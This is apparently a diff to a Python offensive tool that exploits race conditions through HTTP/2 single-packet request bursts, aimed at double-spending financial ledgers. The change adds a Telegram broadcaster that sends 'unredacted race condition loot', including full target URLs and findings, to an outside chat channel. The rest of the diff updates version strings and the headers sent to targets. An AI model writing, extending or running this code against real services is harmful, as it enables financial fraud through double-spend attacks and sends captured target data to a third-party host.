@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-RACE_CONDITION.PY — HTTP/2 Single-Packet Concurrency Engine (Elite Edition)
-Version: 8.1 — Offensive Red Team Concurrency & Ledger Double-Spend Auditor
+RACE_CONDITION.PY — HTTP/2 Single-Packet Concurrency Engine v8.2 (With Telegram Telemetry)
+Version: 8.2 — Offensive Red Team Concurrency & Ledger Double-Spend Auditor
 
 Features:
 - True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread)
@@ -9,6 +9,7 @@ Features:
 - Automated transaction replay & financial ledger double-spend auditing
 - Strict response body inspection (filters out soft-404s and HTML error pages)
 - Immutable timestamped forensic evidence persistence (nexus_evidence/)
+- Real-time asynchronous Telegram notification dispatch for unredacted race condition loot
 
 Python 3.9+
 """
@@ -22,8 +23,11 @@ from pathlib import Path
 from datetime import datetime, timezone
 import httpx
 
+# Import centralized Telegram broadcaster
+from modules.telegram_notifier import send_telegram_alert
+
 MODULE = "RACE_CONDITION"
-VERSION = "8.1"
+VERSION = "8.2"
 
 BASE_DIR = Path(__file__).resolve().parent.parent
 EVIDENCE_DIR = BASE_DIR / "nexus_evidence"
@@ -47,6 +51,18 @@ def log(msg, color="GREEN"):
     ansi_color = COLORS.get(color, color)
     sys.stdout.write(f"{ansi_color}[{MODULE}] {msg}{COLORS['RESET']}\n")
     sys.stdout.flush()
+
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from race condition functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 
 async def fire_multiplexed_stream(client, url, headers, cookies, payload):
@@ -81,7 +97,7 @@ class RaceConditionAuditor:
 
         cookies = dict(self.session_pool.cookie_jar) if self.session_pool and hasattr(self.session_pool, 'cookie_jar') else {}
         default_headers = self.session_pool.default_headers if self.session_pool and hasattr(self.session_pool, 'default_headers') else {
-            "User-Agent": "NEXUS-OffensiveEngine/8.1",
+            "User-Agent": "NEXUS-OffensiveEngine/8.2",
             "Content-Type": "application/json",
             "X-Requested-With": "XMLHttpRequest"
         }
@@ -136,15 +152,21 @@ class RaceConditionAuditor:
 
                 if success_hits > 1:
                     log(f"RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Multiple success windows accepted: {success_hits}/20", "RED")
-                    self.findings.append({
+                    
+                    finding = {
                         "vector": "HTTP/2 Single-Packet Race Condition",
-                        "endpoint": endpoint,
+                        "endpoint": f"{self.base_url}{endpoint}",
                         "successful_streams": success_hits,
                         "total_fired": 20,
                         "severity": "CRITICAL",
                         "evidence": "Multiple state-changing responses accepted in single concurrency window",
                         "timestamp": timestamp()
-                    })
+                    }
+                    self.findings.append(finding)
+
+                    # BROADCAST UNREDACTED RACE CONDITION LOOT STRAIGHT TO TELEGRAM
+                    broadcast_tg_alert_sync("HTTP/2 Race Condition Confirmed", finding)
+
                     break
                 else:
                     log(f"Endpoint {endpoint} safely mitigated concurrency overlap (Success hits: {success_hits}/20)", "GRAY")
